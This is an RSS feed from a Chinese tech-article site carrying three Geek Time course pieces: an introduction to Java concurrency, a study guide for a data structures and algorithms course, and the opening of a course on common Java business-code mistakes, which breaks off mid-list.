<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>技术文章摘抄 – 极客专栏</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/</link><description>Recent content in 极客专栏 on 技术文章摘抄</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Sun, 29 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>极客专栏: 00丨开篇词你为什么需要学习并发编程？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%AD%A6%E4%B9%A0%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%AD%A6%E4%B9%A0%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</guid><description>
&lt;p>你好，我是王宝令，资深架构师，目前从事电商架构的设计工作。从毕业到现在，我前前后后写了 15 年的程序，刚毕业的时候从事证券业务的开发，开发语言是 C/C++，之后从事 ERP 产品的研发，开发语言主要是 C# 和 Java，最近几年主要是从事 Java 开发平台和基础中间件的设计开发工作。&lt;/p>
&lt;p>还记得毕业后我接触的第一个项目是证券相关的，国外的同事用 C 语言写了一个内存数据库，代码写得极为简练优美，我当时怀着无比崇敬的心情把代码看了又看，看完感觉受益匪浅。不过兴奋之余，我也有些焦虑，因为其中一块并发相关的代码，我看得是云里雾里，总感觉自己没有悟透。&lt;/p>
&lt;p>我下意识地告诉自己说这块的知识积累还不够，所以要勤学苦练。你可知道，15 年前相关的学习资料并不多，我的师傅向我推荐了《操作系统原理》这本教材，他说：&amp;ldquo;并发编程最早的应用领域就是操作系统的实现，你把这本书看懂了，并发的问题自然就解决了。&amp;ldquo;但是理论和实践之间总是有鸿沟的，之后好多年，最让我感到无助的还是处理并发相关的问题。&lt;/p>
&lt;p>并发编程的掌握过程并不容易。我相信为了解决这个问题，你也听别人总结过并发编程的第一原则，那就是不要写并发程序。这个原则在我刚毕业的那几年曾经是行得通的，那个时候多核服务器还是一种奢侈品，系统的并发量也很低，借助数据库和类似 Tomcat 这种中间件，我们基本上不用写并发程序。或者说，并发问题基本上都被中间件和数据库解决了。&lt;/p>
&lt;p>&lt;strong>但是最近几年，并发编程已经慢慢成为一项必备技能。&lt;/strong>&lt;/p>
&lt;p>这主要是硬件的驱动以及国内互联网行业的飞速发展决定的，现在 64 核的服务器已经飞入寻常百姓家，大型互联网厂商的系统并发量轻松过百万，传统的中间件和数据库已经不能为我们遮风挡雨，反而成了瓶颈所在。&lt;/p>
&lt;p>于是，并发编程最近几年成为非常热门的领域，人才稀缺。但与此同时，关于并发编程的书籍也渐渐丰富起来了。所以当极客时间团队和我聊这个专栏的时候，我的第一个疑问就是目前市面上已经有很多这方面的图书了，而且很多都非常优秀，是否还有必要搞一个这样的专栏。&lt;/p>
&lt;p>但是深入想过之后，我坚定了写作的信心。这些年接触的大部分同学，都是工作几年后很多技术突飞猛进，却只有并发编程成为瓶颈，虽然并发相关的类库他们也熟悉，却总是写不出正确、高效的并发程序，原因在哪里？我发现很多人是因为某个地方有了盲点，忽略了一些细节，但恰恰是这些细节决定了程序的正确性和效率。&lt;/p>
&lt;p>而这个盲点有时候涉及对操作系统的理解，有时候又涉及一点硬件知识，非常复杂，如果要推荐相关图书，可能要推荐好几本，这就有点&amp;quot;大炮打蚊子&amp;quot;的感觉了，效率很差。同时图书更追求严谨性，却也因此失掉了形象性，所以阅读的过程也确实有点艰辛。&lt;/p>
&lt;p>&lt;strong>我想，如果能够把这些问题解决，那么做这个事情应该是有意义的。&lt;/strong>&lt;/p>
&lt;p>例如，Java 里 synchronized、wait()/notify() 相关的知识很琐碎，看懂难，会用更难。但实际上 synchronized、wait()、notify() 不过是操作系统领域里管程模型的一种实现而已，Java SDK 并发包里的条件变量 Condition 也是管程里的概念，synchronized、wait()/notify()、条件变量这些知识如果单独理解，自然是管中窥豹。但是如果站在管程这个理论模型的高度，你就会发现这些知识原来这么简单，同时用起来也就得心应手了。&lt;/p>
&lt;p>管程作为一种解决并发问题的模型，是继信号量模型之后的一项重大创新，它与信号量在逻辑上是等价的（可以用管程实现信号量，也可以用信号量实现管程），但是相比之下管程更易用。而且，很多编程语言都支持管程，搞懂管程，对学习其他很多语言的并发编程有很大帮助。然而，很多人急于学习 Java 并发编程技术，却忽略了技术背后的理论和模型，而理论和模型却往往比具体的技术更为重要。&lt;/p>
&lt;p>此外，Java 经过这些年的发展，Java SDK 并发包提供了非常丰富的功能，对于初学者来说可谓是眼花缭乱，好多人觉得无从下手。但是，Java SDK 并发包乃是并发大师 Doug Lea 出品，堪称经典，它内部一定是有章可循的。那它的章法在哪里呢？&lt;/p>
&lt;p>&lt;strong>其实并发编程可以总结为三个核心问题：分工、同步、互斥。&lt;/strong>&lt;/p>
&lt;p>所谓&lt;strong>分工&lt;/strong> 指的是如何高效地拆解任务并分配给线程，而&lt;strong>同步&lt;/strong> 指的是线程之间如何协作，&lt;strong>互斥&lt;/strong>则是保证同一时刻只允许一个线程访问共享资源。Java SDK 并发包很大部分内容都是按照这三个维度组织的，例如 Fork/Join 框架就是一种分工模式，CountDownLatch 就是一种典型的同步方式，而可重入锁则是一种互斥手段。&lt;/p>
&lt;p>当把并发编程核心的问题搞清楚，再回过头来看 Java SDK 并发包，你会感觉豁然开朗，它不过是针对并发问题开发出来的工具而已，此时的 SDK 并发包可以任你&amp;quot;盘&amp;quot;了。&lt;/p>
&lt;p>而且，这三个核心问题是跨语言的，你如果要学习其他语言的并发编程类库，完全可以顺着这三个问题按图索骥。Java SDK 并发包其余的一部分则是并发容器和原子类，这些比较容易理解，属于辅助工具，其他语言里基本都能找到对应的。&lt;/p>
&lt;p>&lt;strong>所以，你说并发编程难学吗？&lt;/strong>&lt;/p>
&lt;p>首先，难是肯定的。因为这其中涉及操作系统、CPU、内存等等多方面的知识，如果你缺少某一块，那理解起来自然困难。其次，难不难学也可能因人而异，就我的经验来看，很多人在学习并发编程的时候，总是喜欢从点出发，希望能从点里找到规律或者本质，最后却把自己绕晕了。&lt;/p>
&lt;p>我前面说过，并发编程并不是 Java 特有的语言特性，它是一个通用且早已成熟的领域。Java 只是根据自身情况做了实现罢了，当你理解或学习并发编程的时候，如果能够站在较高层面，系统且有体系地思考问题，那就会容易很多。&lt;/p>
&lt;p>所以，我希望这个专栏更多地谈及问题背后的本质、问题的起源，同时站在理论、模型的角度讲解 Java 并发，让你的知识更成体系，融会贯通。最终让你能够得心应手地解决各种并发难题，同时将这些知识用于其他编程语言，让你的一分辛劳三分收获。&lt;/p>
&lt;p>下面就是这个专栏的目录，你可以快速了解下整个专栏的知识结构体系。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/d5/c0/d513beec13a20d5e858257313b3605c0.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>当然，我们要坚持下去，不能三天打鱼两天晒网，因为滴水穿石非一日之功。&lt;/strong>&lt;/p>
&lt;p>很多人都说学习是反人性的，开始容易，但是长久的坚持却很难。这个我也认同，我面试的时候，就经常问候选人一个问题：&amp;ldquo;工作中，有没有一件事你自己坚持了很久，并且从中获益？&amp;ldquo;如果候选人能够回答出来，那会是整个面试的加分项，因为我觉得，坚持真是一个可贵的品质，一件事情，有的人三分热度，而有的人，一做就能做一年，或者更久。你放长到时间的维度里看，这两种人，最后的成就绝对是指数级的差距。&lt;/p>
&lt;p>我希望你能和我坚持下来，我们一起学习，一起交流，遇到问题不是简单地抱怨和逃避，而是努力探寻答案与解决方法。这一次，就让我们一起来坚持探索并发编程的奥秘，体会探索知识的乐趣。今天的文章是开篇词，我们的主菜很快就来，如果可以的话，还请在留言区中做个自我介绍，和我聊聊你目前的工作、学习情况，以及你在并发编程方面的学习痛点，方便我在后面针对性地给你讲解，这样，我们可以彼此了解。&lt;/p>
&lt;p>最后，感谢你对我的信任，我定会努力实现完美交付。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 《数据结构与算法之美》学习指导手册</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%AF%BC%E6%89%8B%E5%86%8C/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%AF%BC%E6%89%8B%E5%86%8C/</guid><description>
&lt;p>你好，我是王争。&lt;/p>
&lt;p>在设计专栏内容的时候，为了兼顾不同基础的同学，我在内容上做到了难易结合，既有简单的数组、链表、栈、队列这些基础内容，也有红黑树、BM、KMP 这些难度较大的算法。但是，对于初学者来说，一下子面对这么多知识，可能还是比较懵。&lt;/p>
&lt;p>我觉得，对于初学者来说，先把最简单、最基础、最重要的知识点掌握好，再去研究难度较高、更加高级的知识点，这样由易到难、循序渐进的学习路径，无疑是最合理的。&lt;/p>
&lt;p>基于这个路径，我对专栏内容，重新做了一次梳理，希望给你一份具体、明确、有效的学习指导。我会写清楚&lt;strong>每个知识点的难易程度、需要你掌握到什么程度、具体如何来学习&lt;/strong>。&lt;/p>
&lt;p>如果你是数据结构和算法的初学者，或者你觉得自己的基础比较薄弱，希望这份学习指导，能够让你学起来能更加有的放矢，能把精力、时间花在刀刃上，获得更好的学习效果。&lt;/p>
&lt;p>下面，我先给出一个大致的学习路线。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/54/48/54163f16e152f71b8f91d3fba652cf48.jpg" alt="">
（建议保存后查看大图）&lt;/p>
&lt;p>现在，针对每个知识点，我再给你逐一解释一下。我这里先说明一下，下面标记的难易程度、是否重点、掌握程度，都只是针对初学者来说的，如果你已经有一定基础，可以根据自己的情况，安排自己的学习。&lt;/p>
&lt;ol>
&lt;li>复杂度分析&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>尽管在专栏中，我只用了两节课的内容，来讲复杂度分析这个知识点。但是，我想说的是，它真的非常重要。你必须要牢牢掌握这两节，基本上要做到，简单代码能很快分析出时间、空间复杂度；对于复杂点的代码，比如递归代码，你也要掌握专栏中讲到的两种分析方法：递推公式和递归树。&lt;/p>
&lt;p>对于初学者来说，光看入门篇的两节复杂度分析文章，可能还不足以完全掌握复杂度分析。不过，在后续讲解每种数据结构和算法的时候，我都有详细分析它们的时间、空间复杂度。所以，你可以在学习专栏中其他章节的时候，再不停地、有意识地去训练自己的复杂度分析能力。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：10 分&lt;/p>
&lt;p>掌握程度：在不看我的分析的情况下，能自行分析专栏中大部分数据结构和算法的时间、空间复杂度&lt;/p>
&lt;ol start="2">
&lt;li>数组、栈、队列&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这一部分内容非常简单，初学者学起来也不会很难。但是，作为基础的数据结构，数组、栈、队列，是后续很多复杂数据结构和算法的基础，所以，这些内容你一定要掌握。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：8 分&lt;/p>
&lt;p>掌握程度：能自己实现动态数组、栈、队列&lt;/p>
&lt;ol start="3">
&lt;li>链表&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>链表非常重要！虽然理论内容不多，但链表上的操作却很复杂。所以，面试中经常会考察，你一定要掌握。而且，我这里说&amp;quot;掌握&amp;quot;不只是能看懂专栏中的内容，还能将专栏中提到的经典链表题目，比如链表反转、求中间结点等，轻松无 bug 地实现出来。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：9 分&lt;/p>
&lt;p>掌握程度：能轻松写出经典链表题目代码&lt;/p>
&lt;ol start="4">
&lt;li>递归&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>对于初学者来说，递归代码非常难掌握，不管是读起来，还是写起来。但是，这道坎你必须要跨过，跨不过就不能算是入门数据结构和算法。我们后面讲到的很多数据结构和算法的代码实现，都要用到递归。&lt;/p>
&lt;p>递归相关的理论知识也不多，所以还是要多练。你可以先在网上找些简单的题目练手，比如斐波那契数列、求阶乘等，然后再慢慢过渡到更加有难度的，比如归并排序、快速排序、二叉树的遍历、求高度，最后是回溯八皇后、背包问题等。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：10 分&lt;/p>
&lt;p>掌握程度：轻松写出二叉树遍历、八皇后、背包问题、DFS 的递归代码&lt;/p>
&lt;ol start="5">
&lt;li>排序、二分查找&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这一部分并不难，你只需要能看懂我专栏里的内容即可。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：7 分&lt;/p>
&lt;p>掌握程度：能自己把各种排序算法、二分查找及其变体代码写一遍就可以了&lt;/p>
&lt;ol start="6">
&lt;li>跳表&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>对于初学者来说，并不需要非得掌握跳表，所以，如果没有精力，这一章节可以先跳过。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：6 分&lt;/p>
&lt;p>掌握程度：初学者可以先跳过。如果感兴趣，看懂专栏内容即可，不需要掌握代码实现&lt;/p>
&lt;ol start="7">
&lt;li>散列表&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>尽管散列表的内容我讲了很多，有三节课。但是，总体上来讲，这块内容理解起来并不难。但是，作为一种应用非常广泛的数据结构，你还是要掌握牢固散列表。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：8 分&lt;/p>
&lt;p>掌握程度：对于初学者来说，自己能代码实现一个拉链法解决冲突的散列表即可&lt;/p>
&lt;ol start="8">
&lt;li>哈希算法&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这部分纯粹是为了开拓思路，初学者可以略过。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：3 分&lt;/p>
&lt;p>掌握程度：可以暂时不看&lt;/p>
&lt;ol start="9">
&lt;li>二叉树&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这一部分非常重要！二叉树在面试中经常会被考到，所以要重点掌握。但是我这里说的二叉树，并不包含专栏中红黑树的内容。红黑树我们待会再讲。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：9 分&lt;/p>
&lt;p>掌握程度：能代码实现二叉树的三种遍历算法、按层遍历、求高度等经典二叉树题目&lt;/p>
&lt;ol start="10">
&lt;li>红黑树&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>对于初学者来说，这一节课完全可以不看。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：3 分&lt;/p>
&lt;p>掌握程度：初学者不用把时间浪费在上面&lt;/p>
&lt;ol start="11">
&lt;li>B+ 树&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>虽然 B+ 树也算是比较高级的一种数据结构了，但是对初学者来说，也不是重点。有时候面试的时候还是会问的，所以这一部分内容，你能看懂专栏里的讲解就可以了。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：5 分&lt;/p>
&lt;p>掌握程度：可看可不看&lt;/p>
&lt;ol start="12">
&lt;li>堆与堆排序&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这一部分内容不是很难，初学者也是要掌握的。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：8 分&lt;/p>
&lt;p>掌握程度：能代码实现堆、堆排序，并且掌握堆的三种应用（优先级队列、Top k、中位数）&lt;/p>
&lt;ol start="13">
&lt;li>图的表示&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>图的内容很多，但是初学者不需要掌握那么多。一般 BAT 等大厂面试，不怎么会面试有关图的内容，因为面试官可能也对这块不会很熟悉哈：）。但是，最基本图的概念、表示方法还是要掌握的。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：8 分&lt;/p>
&lt;p>掌握程度：理解图的三种表示方法（邻接矩阵、邻接表、逆邻接表），能自己代码实现&lt;/p>
&lt;ol start="14">
&lt;li>深度广度优先搜索&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这算是图上最基础的遍历或者说是搜索算法了，所以还是要掌握一下。这两种算法的原理都不难哈，但是代码实现并不简单，一个用到了队列，另一个用到了递归。对于初学者来说，看懂这两个代码实现就是一个挑战！可以等到其他更重要的内容都掌握之后，再来挑战，也是可以的。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：8 分&lt;/p>
&lt;p>掌握程度：能代码实现广度优先、深度优先搜索算法&lt;/p>
&lt;ol start="15">
&lt;li>拓扑排序、最短路径、A* 算法&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这几个算法稍微高级点。如果你能轻松实现深度、广度优先搜索，那看懂这三个算法不成问题。不过，这三种算法不是重点。面试不会考的。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：5 分&lt;/p>
&lt;p>掌握程度：有时间再看，暂时可以不看&lt;/p>
&lt;ol start="16">
&lt;li>字符串匹配（BF、RK）&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>BF 非常简单，RK 稍微复杂点，但都不难。这个最好还是掌握下。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：7 分&lt;/p>
&lt;p>掌握程度：能实践 BF 算法，能看懂 RK 算法&lt;/p>
&lt;ol start="17">
&lt;li>字符串匹配（BM、KMP、AC 自动机）&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这三个算法都挺难的，对于算法有一定基础的人来说，看懂也不容易。所以，对于初学者来说，千万别浪费时间在这上面。即便有余力，看懂就好了，不用非得能自己实现。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：3 分&lt;/p>
&lt;p>掌握程度：初学者不用把时间浪费在上面&lt;/p>
&lt;ol start="18">
&lt;li>字符串匹配（Trie）&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这个还是要能看懂，不过不需要能代码实现。有些面试官喜欢考这个东西，主要是结合应用场景来考察，只是看你知不知道要用 Trie 树这个东西。&lt;/p>
&lt;p>难易程度：Medium&lt;/p>
&lt;p>是否重点：7 分&lt;/p>
&lt;p>掌握程度：能看懂，知道特点、应用场景即可，不要求代码实现&lt;/p>
&lt;ol start="19">
&lt;li>位图&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>位图不是重点，如果有余力最好掌握一下。&lt;/p>
&lt;p>难易程度：Easy&lt;/p>
&lt;p>是否重点：6 分&lt;/p>
&lt;p>掌握程度：看懂即可，能自己实现一个位图结构最好&lt;/p>
&lt;ol start="20">
&lt;li>四种算法思想&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>这个是重点，也是难点。贪心、分治、回溯、动态规划，每一个都不简单，其中动态规划又是最难、最烧脑的。要应付 FLAG 这样公司的面试，必须拿下这块内容。但是呢，学习要循序渐进，这块能内容的学习可以放到最后，做个长时间的学习计划来攻克。&lt;/p>
&lt;p>这块内容理论的东西不多，要想真的掌握，还是要大量刷题。&lt;/p>
&lt;p>难易程度：Hard&lt;/p>
&lt;p>是否重点：10 分&lt;/p>
&lt;p>掌握程度：可以放到最后，但是一定要掌握！做到能实现 Leetcode 上 Medium 难度的题目&lt;/p>
&lt;hr>
&lt;p>学而时习之，专栏虽然已经结束，但是学习的同学和留言依旧源源不断。希望这份学习指导手册对你有帮助，也欢迎你继续给我留言，和大家一起交流、学习、进步。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/8e/d3/8e603e3d795fc0ab2698f6f5eabf14d3.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨业务代码真的会有这么多坑？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E7%9C%9F%E7%9A%84%E4%BC%9A%E6%9C%89%E8%BF%99%E4%B9%88%E5%A4%9A%E5%9D%91/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E7%9C%9F%E7%9A%84%E4%BC%9A%E6%9C%89%E8%BF%99%E4%B9%88%E5%A4%9A%E5%9D%91/</guid><description>
&lt;p>你好，我是朱晔，贝壳金服的资深架构师。&lt;/p>
&lt;p>我先和你说说我这 15 年的工作经历吧，以加深彼此的了解。前 7 年，我专注于.NET 领域，负责业务项目的同时，也做了很多社区工作。在 CSDN 做版主期间，我因为回答了大量有关.NET 的问题，并把很多问题的答案总结成了博客，获得了 3 次微软 MVP 的称号。&lt;/p>
&lt;p>后来，我转到了 Java 领域，也从程序员变为了架构师，更关注开源项目和互联网架构设计。在空中网，我整体负责了百万人在线的大型 MMO 网游《激战》技术平台的架构设计，期间和团队开发了许多性能和稳定性都不错的 Java 框架；在饿了么，我负责过日千万订单量的物流平台的开发管理和架构工作，遇到了许多只有高并发下才会出现的问题，积累了大量的架构经验；现在，我在贝壳金服的基础架构团队，负责基础组件、中间件、基础服务开发规划，制定一些流程和规范，带领团队自研 Java 后端开发框架、微服务治理平台等，在落地 Spring Cloud 结合 Kubernetes 容器云平台技术体系的过程中，摸索出了很多适合公司项目的基础组件和最佳实践。&lt;/p>
&lt;p>这 15 年来，我一直没有脱离编码工作，接触过大大小小的项目不下 400 个，自己亲身经历的、见别人踩过的坑不计其数。我感触很深的一点是，业务代码中真的有太多的坑：有些是看似非常简单的知识点反而容易屡次踩坑，比如 Spring 声明式事务不生效的问题；而有些坑因为&amp;quot;潜伏期&amp;quot;长，引发的线上事故造成了大量的人力和资金损失。因此，我系统梳理了这些案例和坑点，最终筛选出 100 个案例，涉及 130 多个坑点，组成了这个课程。&lt;/p>
&lt;h1 id="意识不到业务代码的坑很危险">意识不到业务代码的坑，很危险&lt;/h1>
&lt;p>我想看到 100、130 这两个数字，你不禁要问了：&amp;ldquo;我写了好几年的业务代码了，遇到问题时上网搜一下就有答案，遇到最多的问题就是服务器不稳定，重启一下基本就可以解决，哪里会有这么多坑呢？&amp;ldquo;带着这个问题，你继续听我往下说吧。&lt;/p>
&lt;p>据我观察，很多开发同学没意识到这些坑，有以下三种可能：&lt;/p>
&lt;ul>
&lt;li>意识不到坑的存在，比如所谓的服务器不稳定很可能是代码问题导致的，很多时候遇到 OOM、死锁、超时问题在运维层面通过改配置、重启、扩容等手段解决了，没有反推到开发层面去寻找根本原因。&lt;/li>
&lt;li>有些问题只会在特定情况下暴露。比如，缓存击穿、在多线程环境使用非线程安全的类，只有在多线程或高并发的情况才会暴露问题。&lt;/li>
&lt;li>有些性能问题不会导致明显的 Bug，只会让程序运行缓慢、内存使用增加，但会在量变到质变的瞬间爆发。&lt;/li>
&lt;/ul>
&lt;p>而正是因为没有意识到这些坑和问题，采用了错误的处理方式，最后问题一旦爆发，处理起来就非常棘手，这是非常可怕的。下面这些场景有没有感觉似曾相识呢？&lt;/p>
&lt;p>比如，我曾听说过有一个订单量很大的项目，每天总有上千份订单的状态或流程有问题，需要花费大量的时间来核对数据，修复订单状态。开发同学因为每天牵扯太多经历在排查问题上，根本没时间开发新需求。技术负责人为此头痛不已，无奈之下招了专门的技术支持人员。最后痛定思痛，才决定开启明细日志彻查这个问题，结果发现是自调用方法导致事务没生效的坑。&lt;/p>
&lt;p>再比如，有个朋友告诉我，他们的金融项目计算利息的代码中，使用了 float 类型而不是 BigDecimal 类来保存和计算金额，导致给用户结算的每一笔利息都多了几分钱。好在，日终对账及时发现了问题。试想一下，结算的有上千个用户，每个用户有上千笔小订单，如果等月终对账的时候再发现，可能已经损失了几百万。&lt;/p>
&lt;p>再比如，我们使用 RabbitMQ 做异步处理，业务处理失败的消息会循环不断地进入 MQ。问题爆发之前，可能只影响了消息处理的时效性。但等 MQ 彻底瘫痪时，面对 MQ 中堆积的、混杂了死信和正常消息的几百万条数据，你除了清空又能怎么办。但清空 MQ，就意味着要花费几小时甚至几十小时的时间，来补正常的业务数据，对业务影响时间很长。&lt;/p>
&lt;p>像这样由一个小坑引发的重大事故，不仅仅会给公司造成损失，还会因为自责影响工作状态，降低编码的自信心。我就曾遇到过一位比较负责的核心开发同学，因为一个 Bug 给公司带来数万元的经济损失，最后心理上承受不住提出了辞职。&lt;/p>
&lt;p>其实，很多时候不是我们不想从根本上解决问题，只是不知道问题到底在了哪里。要避开这些坑、找到这些定时炸弹，第一步就是得知道它们是什么、在哪里、为什么会出现。而讲清楚这些坑点和相关的最佳实践，正是本课程的主要内容。&lt;/p>
&lt;h1 id="这个课程是什么">这个课程是什么？&lt;/h1>
&lt;p>如果用几个关键词概括这个课程的话，那我会选择&amp;quot;Java&amp;quot;&amp;ldquo;业务开发&amp;quot;&amp;ldquo;避坑 100 例&amp;quot;这 3 个。接下来，我就和你详细说说这个课程是什么，以及有什么特点。&lt;/p>
&lt;p>&lt;strong>第一个关键词是&amp;quot;Java&amp;rdquo;&lt;/strong>，指的是课程内所有 Demo 都是基于 Java 语言的。&lt;/p>
&lt;p>如果你熟悉 Java，那可以 100% 体会到这些坑点，也可以直接用这些 Demo 去检查你的业务代码是否也有类似的错误实现。&lt;/p>
&lt;p>如果你不熟悉 Java 问题也不大，现在大部分高级语言的特性和结构都差不多，许多都是共性问题。此外&amp;quot;设计篇&amp;quot;&amp;ldquo;安全篇&amp;quot;的内容，基本是脱离具体语言层面的、高层次的问题。因此，即使不使用 Java，你也可以有不少收获，这也是本课程的第一个特点。&lt;/p>
&lt;p>讲到这里，我要说明的是，这个课程是围绕坑点而不是 Java 语言体系展开的，因此不是系统学习 Java 的教材。&lt;/p>
&lt;p>&lt;strong>第二个关键词是&amp;quot;业务开发&amp;rdquo;，也就是说课程内容限定在业务项目的开发，侧重业务项目开发时可能遇到的坑。&lt;/strong>&lt;/p>
&lt;p>我们先看&amp;quot;业务&amp;quot;这个词。做业务开发时间长的同学尤其知道，业务项目有两大特点：&lt;/p>
&lt;ul>
&lt;li>工期紧、逻辑复杂，开发人员会更多地考虑主流程逻辑的正确实现，忽略非主流程逻辑，或保障、补偿、一致性逻辑的实现；&lt;/li>
&lt;li>往往缺乏详细的设计、监控和容量规划的闭环，结果就是随着业务发展出现各种各样的事故。&lt;/li>
&lt;/ul>
&lt;p>根据这些性质，我总结出了近 30 个方面的内容，力求覆盖业务项目开发的关键问题。案例的全面性，是本课程的第二大特点。&lt;/p>
&lt;p>这些案例可以看作是 Java 业务代码的避坑大全，帮助你写出更好的代码，也能帮你进一步补全知识网增加面试的信心。你甚至可以把二级目录当作代码审核的 Checklist，帮助业务项目一起成长和避坑。&lt;/p>
&lt;p>我们再看&amp;quot;开发&amp;quot;这个词。为了更聚焦，也更有针对性，我把专栏内容限定在业务开发，不会过多地讨论架构、测试、部署运维等阶段的问题。而&amp;quot;设计篇&amp;rdquo;，重在讲述架构设计上可能会遇到的坑，不会全面、完整地介绍高可用、高并发、可伸缩性等架构因素。&lt;/p>
&lt;p>&lt;strong>第三个关键词是&amp;quot;避坑 100 例&amp;rdquo;。坑就是容易犯的错，避坑就是踩坑后分析根因，避免重复踩同样的坑。&lt;/strong>&lt;/p>
&lt;p>整个课程 30 篇文章，涉及 100 个案例、约 130 个小坑，其中 40% 来自于我经历过或者是见过的 200 多个线上生产事故，剩下的 60% 来自于我开发业务项目，以及日常审核别人的代码发现的问题。贴近实际，而不是讲述过时的或日常开发根本用不到的技术或框架，就是本课程的第三大特点了。&lt;/p>
&lt;p>大部分案例我会配合一个可执行的 Demo 来演示，Demo 中不仅有错误实现（踩坑），还有修正后的正确实现（避坑）。完整且连续、授人以渔，是本课程的第四大特点。&lt;/p>
&lt;ul>
